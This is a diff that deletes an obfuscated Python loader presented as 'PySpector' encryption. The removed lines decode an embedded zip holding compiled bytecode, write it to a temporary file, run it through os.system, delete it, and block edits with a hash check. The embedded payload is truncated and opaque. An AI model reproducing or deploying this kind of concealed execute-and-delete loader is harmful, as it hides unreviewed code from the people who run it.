@@ -1,39 +1,3 @@
-# -*- coding: utf-8 -*-
-# 🔐 Encryption Via PySpector Enc--v2
-
-___________ = ().__class__.__base__;___________;___________;___________
-x=___________;___________
-___________ = ().__class__.__base__;___ = (lambda x: ''.join(map(chr, x)));___________ = ().__class__.__base__;________ = (set() & set()) or [].append;___________ = ().__class__.__base__;________ = (set() & set()) or [].append;___________ = ().__class__.__base__;____ = (lambda x: __import__(___(x)));___________ = ().__class__.__base__;_____ = ____([111, 115])
-___________ = ().__class__.__base__;______ = ____([98, 97, 115, 101, 54, 52]);___________ = ().__class__.__base__;___________ = ().__class__.__base__
-_______ = ____([116, 101, 109, 112, 102, 105, 108, 101]);____________________________________________________________x_= ().__class__.__base__;___________ = ().__class__.__base__;________ = (lambda:[46,101,110,99,114,121,112,116,101,100]);___________i = (lambda:0)()
-___________;___________;I = ().__class__.__base__;___________x___________=().__class__.__base__;_________ = (lambda x: ___(________()) if x==0 else ".tmp.zip");___________iii = ().__class__.__base__
-__________ = (lambda n, d: (lambda f: (f.write(______.b64decode(d.encode())), f.flush(), f.close()))(open(n, 'wb')));________ii=next(iter([]), None);___________iii;___________iii;___________ = ().__class__.__base__;___________;___________;___________
-___________ = (lambda f: _____.system('python ' + f));().__class__.__base__;___________;___________;___________;___________;___________;___________;___________;___________;___________
-____________ = (lambda n: _____.remove(n) if _____.path.exists(n) else None)
-
-___________;___________;___________;___________;___________;___________;___________;___________;___________;___________;____________________ = "Shishya"
-___________x___________;___________x___________;_____________________ = "Kriyox"
-___________x___________;___________x___________;______________________ = "b9d4772332e9dcc5376f1869cf910fe456c6bcf2ad897fc13966c834f7a6b643"
-
-_______________________ = (lambda: (
-    (lambda __combined:
-        (__import__(''.join(map(chr, [104, 97, 115, 104, 108, 105, 98])))
-         .sha256(__combined.encode()).hexdigest() != ______________________) and
-        (_ for _ in ()).throw(Exception("file will not run anymore as main function changed"))
-    )(____________________ + _____________________)
-));____________________________________________________________x_;____________________________________________________________x_;___________x___________
-___________;___________;___________;___________;_____________ = """UEsDBBQAAAAAAJtia1vGKZMnEOYBABDmAQAMAAAAX19tYWluX18ucHlj8w0NCgAAAAAmKhNpxBcDAOMA
-AAAAAAAAAAAAAAAIAAAAAAAAAPNEAAAAlQBTABoAcgBTAXIBUwJyAlwAIgBcAlwBNQIAAAAAAAByA1wE
-IgBcBSIAXAM9AXIGUwNTBFMFOQM1AQAAAAAAACAAZwYpB2MCAAAAAAAAAAAAAAAIAAAAAwAAAPMOAQAA
-XgBeA5UAUwFSAQAAAAAAAAAAAAAAAAAAAAAAAFUANAFTAhoAaghbAwAAAAAAAAAAWwUAAAAAAAAAAFQA
-NQEAAAAAAABTAy0CAAA1AQAAAAAAABMANQAAAAAAAAA1AQAAAAAAAG4CUwFSAQAAAAAAAAAAAAAAAAAA
-AAAAAFUANAFTBBoAaghbAwAAAAAAAAAAWwUAAAAAAAAAAFQANQEAAAAAAABTAy0CAAA1AQAAAAAAABMA
-NQAAAAAAAAA1AQAAAAAAAG0DUwFSAQAAAAAAAAAAAAAAAAAAAAAAAFUDNAFTBRoAaghbBwAAAAAAAAAA
-VQI1AQAAAAAAABMANQAAAAAAAAA1AQAAAAAAACQAKQZO2gBjAQAAAAAAAAAAAAAABAAAADMAAADzNAAA
-AD4BIwAgAJUAVQATAEgNAABuAVQCVQFTAC0FAAAFAAAAdgCVBSAATQ8AAAsAIABnATcDZgEpAukCAAAA
-TqkAqQPaAi4w2gFp2g1kYXRhX3dpdGhfa2V5cwMAAAAgIIDaGS90bXAvdG1wenY2OXp4Y29fa2lyYXgu
-cHnaCTxnZW5leHByPtofS2lyYXhTaGlzaHlhLjxsb2NhbHM+LjxnZW5leHByPgIAAABzHAAAAPjpAIAA
-0BxY0jlXsEGYXagxqFGpM9YdL9I5V/lzBAAAAIMVGAFyBQAAAGMBAAAAAAAAAAAAAAAEAAAAMwAAAPM6
 AAAAPgEjACAAlQBVABMASBAAAG4BVAJVAVMALQUAAFMBLQAAAAUAAAB2AJUFIABNEgAACwAgAGcCNwNm
 ASkDcgUAAADpAQAAAE5yBgAAAHIHAAAAcwMAAAAgIIByCwAAAHIMAAAAcg0AAAADAAAAcyAAAAD46QCA
 ANARUdIyUKhRkC2gAaAhoQOgYaEH1hIo0jJQ+XMEAAAAgxgbAWMBAAAAAAAAAAAAAAALAAAAMwAAAPOG
